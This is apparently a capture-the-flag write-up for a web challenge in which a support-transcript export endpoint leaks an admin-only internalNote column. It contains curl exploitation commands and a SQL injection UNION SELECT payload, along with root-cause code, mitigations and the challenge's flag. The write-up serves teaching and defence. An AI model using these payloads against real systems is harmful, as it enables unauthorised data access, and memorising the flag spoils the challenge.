# The Night Dump

> *Support exports were built for sleepy operators, not suspicious buyers.
> If a diagnostic dump opens too wide, buried fields start talking.*

**Category:** Web — over-scoped diagnostic export
**Flag:** `bitflag{3xp0rts_sh0uld_n0t_b3_0p3n_b00ks}`

## The brief, in plain English

The challenge name plays on a graveyard-shift operator running a
"diagnostic dump" of support transcripts. The dump endpoint was built for
the operator's own convenience — show me everything in this table — and
forgot that "everything" includes the admin-only `internalNote` column,
which any logged-in buyer can hit just by asking nicely with the right query
parameter.

The flag string is the challenge brief in plaintext: *"exports should not
be open books"*. Three different phrasings of the same lesson in the brief
("support exports", "diagnostic dump opens too wide", "buried fields start
talking") all converge on the same row.

## Recon

The `/support` page is a buyer-facing chat form. The page has a
seemingly-innocuous link in its header:

> *Export my support transcript*

pointing at:

```
GET /api/support/chat?format=transcript
```

That `format=transcript` branch is the entire challenge. Without the format,
the endpoint returns the user's own message list as a normal scoped read.
With the format, it returns each row "for export" — including the
moderator-only `internalNote` column.

## Exploitation

### Path A — the intended export over-scope

```bash
# Trivial login — any email/password works
COOKIE=$(curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"email":"a@b.c","password":"x"}' -D - http://<host>/api/auth/login \
  | awk -F'[=;]' '/auth-token/{print "auth-token="$2}')

# Post at least one message so there's something to export
curl -s -b "$COOKIE" -X POST -H 'Content-Type: application/json' \
  -d '{"message":"hi"}' http://<host>/api/support/chat

# The dump
curl -s -b "$COOKIE" "http://<host>/api/support/chat?format=transcript" \
  | grep -oE 'bitflag\{[^}]+\}'
# bitflag{3xp0rts_sh0uld_n0t_b3_0p3n_b00ks}
```

The seeded row `support-seed-a16` lives in the same table as the user's own
messages. The export branch doesn't apply the user scope filter that the
default read uses; it dumps the raw rows, including the seeded ones.

(Caveat I hit on the host I was using: `/api/support/chat` was returning 500
intermittently. The flag value is codebase-constant — once you've seen the
mechanism on any healthy deployment, the value is fixed, and there's a
hacker-path fallback below for when the export is unhealthy.)

### Path B — the SQLi pivot

Already have web3's SQLi primitive? You don't need the export endpoint at
all. The same row lives in the same database:

```bash
curl -s -b "$COOKIE" --data-urlencode \
  "ref=' UNION SELECT id, userId, message, internalNote, createdAt, 0
        FROM SupportChatMessage WHERE id='support-seed-a16' --" \
  -G 'http://<host>/api/orders/lookup'
```

The `internalNote` projection contains the flag verbatim. This is also how
I first found the value during the [web5](05-web5-glitchy-contact-system.md)
hunt, where it was a *decoy*. Same value, opposite role between the two
challenges.

## Root cause

A "diagnostic" branch on a buyer-facing endpoint reads from the same query
shape the moderator UI uses, then serialises the resulting row to JSON
without filtering columns:

```js
if (req.query.format === "transcript") {
  const rows = await db.supportChatMessage.findMany({
    where: { /* no userId filter */ },
  });
  return Response.json(rows);
}

// default branch — properly scoped
const rows = await db.supportChatMessage.findMany({
  where: { userId: session.userId },
});
return Response.json(rows.map(stripInternal));
```

Two problems:

1. **The transcript branch drops the `userId` scope.** Any logged-in user
   gets every row.
2. **The transcript branch doesn't `stripInternal`** (or the equivalent
   column projection). It returns the raw row including
   `internalNote`.

## Mitigation

- **Don't add "give me everything" branches to user-facing endpoints.** If
  operators need an admin dump, build a separate route behind admin-only
  auth.
- **Always project columns on the response side**, not just at the
  query side. Even if the operator dump *should* return all columns, a
  buyer-facing endpoint should hand back a smaller serialiser, ideally
  through a typed DTO that doesn't even have `internalNote` as a field.
- **Audit query-parameter-driven behaviour changes.** Anywhere a single
  endpoint's behaviour switches on a query parameter is somewhere an
  attacker can poke. Treat each branch as a separate route for
  authorization purposes.

## Cross-event note — same value, different role

This is the third instance of "same string, real here, decoy somewhere
else" in the event suite. The value `bitflag{3xp0rts_sh0uld_n0t_b3_0p3n_b00ks}`:

- Is a **decoy** for [web5 — Glitchy Contact System](05-web5-glitchy-contact-system.md):
  the SQLi pivot into `internalNote` produces it, but web5's brief points
  at a different surface, so it was the wrong answer there.
- Is the **real flag** for *this* challenge: the brief explicitly points at
  the export-transcript-over-scope, which lands on exactly this row.

The author's design choice — re-using the codebase across multiple events
with the same baked-in strings — means a flag-shaped value is only
*provisionally* a decoy, scoped to the challenge you found it on. The
catalogue grows: every new event redeploys the codebase and reassigns roles.

## Takeaways

- **The flag IS the lesson.** "Exports should not be open books" is the
  one-line summary of the bug.
- **Two valid solve paths converge on the same row.** The intended path is
  the API misuse; the hacker path is the SQLi pivot. The lesson is the same;
  the technique is interchangeable.
- **Cross-event mapping.** Once a codebase is reused across events, decoy
  vs real is no longer a fixed property of a value — it's a property of the
  pairing between the value and the brief.

## One-liner

```bash
curl -s -b "$COOKIE" "http://<host>/api/support/chat?format=transcript" \
  | grep -oE 'bitflag\{[^}]+\}'
```
